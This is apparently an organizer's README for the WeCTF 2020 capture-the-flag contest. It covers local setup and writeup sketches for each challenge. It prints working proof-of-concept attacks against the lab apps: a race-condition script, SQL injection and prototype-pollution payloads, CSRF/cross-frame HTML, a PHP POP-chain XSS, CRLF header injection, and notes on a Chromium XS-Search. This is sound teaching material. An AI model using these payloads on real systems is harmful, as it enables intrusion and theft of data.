# WeCTF 2020

Thank you all for participating! This README contains my writeup sketches. You can also share your writeup on CTFtime.

### Run Challenges Locally

```shell
git clone https://github.com/shouc/wectf-2020
cd wectf-2020 && docker-compose up
```

The mapping is as following

```
localhost:1000 -> CORBra // CAVEAT: only solvable over HTTPS
localhost:1001 -> Customer 
localhost:1002 -> Faster Shop
localhost:1003 -> KVaaS
localhost:1004 -> lightSequel
localhost:1005 -> Note App
localhost:1006 -> Note App 2
localhost:1007 -> Note App 3
localhost:1008 -> urlLongener
```

If you are using NGINX: 

```
server {
        listen 80;
        server_name corbra.cf;
        location / {
        	proxy_pass http://localhost:1000/;
    	}
}
server {
        listen 80;
        server_name customer.*;
        location / {
        	proxy_pass http://localhost:1001/;
    	}
}
server {
        listen 80;
        server_name kvaas.*;
        location / {
        	proxy_pass http://localhost:1003/;
    	}
}
server {
        listen 80;
        server_name na1.*;
        location / {
        	proxy_pass http://localhost:1005/;
    	}
}
server {
        listen 80;
        server_name na2.*;
        location / {
        	proxy_pass http://localhost:1006/;
    	}
}
server {
        listen 80;
        server_name na3.*;
        location / {
        	proxy_pass http://localhost:1007/;
    	}
}
server {
        listen 80;
        server_name url.*;
        location / {
        	proxy_set_header Host $host;
		proxy_pass http://localhost:1008/;
    	}
}
```

\* lightSequel and Faster Shop are less solvable behind NGINX so they are not proxied

### Writeup - API

*151 solves / 10 pts*

*Description: We have hidden a flag at our API endpoint! Happy hunting.*

You can find the URL of API by checking dev tool's Network tab.

```
curl https://api.wectf.io/
```

### Writeup - UCSB

*31 solves / 20 pts*

*Description: Could you get footage of CCTV at <a href="https://www.google.com/maps/place/Ortega+Dining+Commons,+Isla+Vista,+CA+93117/" target="_blank">this location</a>? Send your Proof of Concept to @shou on Slack.  
Hint 1: All CCTVs are protected by password, but how about services depending on them? Please don't spam anyone : )*

Search on Google and you would find [this](https://www.housing.ucsb.edu/dining/dining-cams)

### Writeup - Note App (IDOR)

*212 solves / 100 pts*

*Description: Write your diary on Shou's note app so he can eavesdrop every single byte of it!!!*

After login, visit http://host/note/1

### Writeup - RE

*89 solves / 341 pts*

*Description: Obviously, angr cannot solve this challenge. Note 1: wrap whatever you get with we{}*

The code is obfuscated with YAK Pro. You can find unobfuscated one in this repo.

### Writeup - Faster Shop (Race Condition)

*82 solves / 345 pts*

*Description: Be as fast as possible to fast!*

No lock presents in db queries. PoC:

```python
from requests import post
from multiprocessing import *
import time
def f():
    post("http://host/buy/1", headers={
        "cookie": "token=[YOUR TOKEN]"
    })
for i in range(20):
    p = Process(target=f)
    p.start()
time.sleep(2)
```

### Writeup - Customer (CSRF)

*47 solves / 382 pts*

*Description: Shou just told admins in his company not to click any link sent by unknowns but they are just too ignorant and assume Chrome is so secure…*

You can simply generate payload with any existing tool for CSRF profiling.

### Writeup - lightSequel (SQL Injection)

*24 solves / 1174 pts*

*Description: Shou just learnt gRPC! Go play with his nasty API!*

CAVEAT 1: a hostname is given but obviously only IP works

Code that causes SQL Injection:

```go
// main.go:L69
Where(fmt.Sprintf("user_id = (SELECT id FROM users WHERE token = '%s')", userToken)).
```

PoC (bruteforce each character):

```go
md := metadata.Pairs("user_token", "1' OR (SELECT COUNT(*) FROM flags WHERE flag LIKE '%we{%') > 0))/*")
ctx = metadata.NewOutgoingContext(context.Background(), md)
var header, trailer metadata.MD
r, err := c.GetLoginHistory(ctx, &pb.SrvRequest{}, grpc.Header(&header), grpc.Trailer(&trailer))
```

### Writeup - KVaaS (Prototype Pollution)

*21 solves / 1219 pts*

*Description: Shou, after successfully created all those Apps, starts to get ballsier and claims that every database should use HTTP to communicate with the client. Thus, he rewrites Redis in his favorite language Javascript and announces he created first KVaaS.*

```
curl http://host/set?user_token=__proto__&key=redis_set&value=[YOUR COMMAND];
curl -X PUT http://host/backup
```

### Writeup - Note App 2 (CSRF + XFS)

*7 solves / 1635 pts*

*Description: Shou just made a few updates to the former Note App: added logout function, allowed writing HTML in notes, and most importantly made everything more (un)secured. Note 1: Note App's issue is addressed here.*

main.html (some code borrowed from https://blog.d1r3wolf.com/2020/04/chaning-no-impactna-bugs-to-get-high.html)

```html
<div id=iframe1></div>
<div id=iframe2></div>
<div id=iframe3></div>
<div id=iframe4></div>
<script>
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
async function main(){
    ifr = document.createElement('iframe');
    ifr.src = "http://[HOST]/note/1";
    ifr.name='admin';
    iframe1.appendChild(ifr);
    await sleep(1000);
    ifr2 = document.createElement('iframe');
    ifr2.name='attack';
    ifr2.src = "/test2.html";
    iframe2.appendChild(ifr2);
    await sleep(1000);
    ifr3 = document.createElement('iframe');
    ifr3.name='attack';
    ifr3.src = "/test3.html";
    iframe3.appendChild(ifr3);
    await sleep(1000);
    ifr4 = document.createElement('iframe');
    ifr4.name='attack';
    ifr4.src = "http://[HOST]/note/5"; // <- Your note with code e.g.:
    // <script>console.log(window.top.frames[0].document.getElementsByTagName('p')[0].innerText)<script>
    iframe4.appendChild(ifr4);
}
main();
</script>
```

test2.html

```html
<form method="post" action="http://[HOST]/logout" id="s">
    <input type="submit">
</form>
<script>
    document.getElementById("s").submit()
</script>
```

test3.html

```html
<form method="post" action="http://[HOST]/" id="s">
    <input name="username" value="[YOUR CREDENTIAL]">
    <input name="password" value="[YOUR CREDENTIAL]">

    <input type="submit">
</form>
<script>
    document.getElementById("s").submit();
</script>
```

### Writeup - Note App 3 (POP Chain + Race Condition)

*2 solves / 1942 pts*

*Description: PHP is the most production-ready and CTF-challenge-ready language huh?*

Make POP chain to pwn `/api/Utils.inc:26` so as to insert HTML without sanitization.

```php
<?php
namespace Objects{class User{public function __construct($username = "", $password = "", $id = 0, $token = ""){$this->username = $username;$this->password = $password;$this->token = $token;$this->id = $id;}public function set_enc_password($password){ $this->password = $password; }}class Note{public function __construct(User $author = null, $content = "", $id = 0, $token = ''){$this->id = $id;$this->author = $author;$this->content = $content;$this->token = $token;}}}

namespace Events {use Objects\Note;class NoteInsert{private $note;public function __construct(Note $n){$this->note = $n;}}}

namespace a{
    $user = new \Objects\User("[YOUR USERNAME]", "", 1, "");
    $note = new \Objects\Note($user, "<script>alert(1)</script>", 0, "");
    $ob = new \Events\NoteInsert($note);
    $user->set_enc_password($ob);
    echo serialize($user);
}
```

After getting XSS works, bypass sandbox by using an iframe and control the hash.

### Writeup - urlLongener (CRLF Injection + CORS Misconf)

*8 solves / 1586 pts*

*Description: Shou just wrote a short url generator to generate not so short urls Note 1: Flag is in the link admin created. Each user needs to be in the same IP and UA to get access their data. Note 2: Server is running on a patched version to compensate the NGINX issue. Code here is solely for providing some insights. Do not test your payload on it .*

Exploit:

```
curl http://host/redirect?location=abc\r\na: b
```

Then get admin token:

This line `controllers.py:L66` ensures no XSS code could be injected. However, we can inject headers like following, so any website can get the whole response, including JWT, from chall website:

```
Access-Control-Allow-Credential: true
Access-Control-Allow-Origin: *
```

Then fake your IP with `X-Forwarded-For` and all set : )   
^ It is actually not correct as pointed out in writeup by [@dshynkev](https://github.com/dshynkev/ctf-writeups/tree/master/2020/wectf/url_longener). The reason is this app is served behind NGINX during the CTF, so all requests' IP is 127.0.0.1. My bad : (

### Writeup - CORBra (XS-Search)

*1 solve / 2000 pts*

🎉 Team `lsof -i:80` is the only team that solved this completely. Good Job!!

*Description: Shou stores one flag in his fancy CORBra Vault.  Hint 1: You may need CVE-2020-6442*

It is impossible to bypass CORB check in HTML, but for JSON, notice that:

```php
if ($limit > 0){
    if ($limit > count($secret_arr)){
        trigger_error("Limit is greater than length of array!", E_USER_WARNING);
    ...
```

which produce a JSON with warning HTML that disrupts the following check:

```c
// Simplified code from Chromium
// Full code: https://source.chromium.org/chromium/chromium/src/+/master:services/network/cross_origin_read_blocking.cc;l=459
int SniffForJSON(char* data, int size) {
  enum {
    kStartState,
    kLeftBraceState,
    kLeftQuoteState,
    kEscapeState,
    kRightQuoteState,
  } state = kStartState;

  for (int i = 0; i < size; ++i) {
    const char c = data[i];
    if (state != kLeftQuoteState && state != kEscapeState) {
      // Whitespace is ignored (outside of string literals)
      if (c == ' ' || c == '\t' || c == '\r' || c == '\n')
        continue;
    } else {
      // Inside string literals, control characters should result in rejection.
      if ((c >= 0 && c < 32) || c == 127)
        return 0;
    }

    switch (state) {
      case kStartState:
        if (c == '{')
          state = kLeftBraceState;
        else
          return 0;
        break;
      case kLeftBraceState:
        if (c == '"')
          state = kLeftQuoteState;
        else
          return 0;
        break;
      case kLeftQuoteState:
        if (c == '"')
          state = kRightQuoteState;
        else if (c == '\\')
          state = kEscapeState;
        break;
      case kEscapeState:
        // Simplification: don't bother rejecting hex escapes.
        state = kLeftQuoteState;
        break;
      case kRightQuoteState:
        if (c == ':')
          return 2;
        return 0;
    }
  }
  return 1;
}
```

Note that CORBra-- is considered to be solved if participants reach this step and managed to get cache diff works on same origin. 

Then, use following CVE to conduct XS-Search: https://bugs.chromium.org/p/chromium/issues/detail?id=1013906. @posix and @DayDun manage to reproduce part of this. One key factor to concern is that the algorithm is like

```
what you can get = 
bytes of requests without cookie + bytes of random padding - 
(bytes of requests with cookie + bytes of same random padding)
```

### Cliche

Data:

* There are 712 teams from 26 different countries registered their account. 
* Infrastructure has served 2.8TB requests. 
* There are up to 257 teams solved at least one challenge. 
* Congrats to `st9846` `UWCTF`, `lsof -i:80`, which are respectively first, second, and third place. 

What have I screwed up:

* KVaaS: I did not proofread my JS code carefully, leaving two small typos. Moreover, I forgot to test it (I really put it on my note) remotely, leaving the flag file empty at the beginning due to Docker not passing args and read-only system issues.
I am super sorry for the inconvinience I have created : (
* urlLongener: I did not notice the request altering caused by NGINX as well as AJAX, which creates ambiguity on the source code. It is fixed after 13PM PDT. 
* Quota in Google Cloud prevented me from creating more than 32 cores. So, I have to migrate some instance to another account and pay for them : (


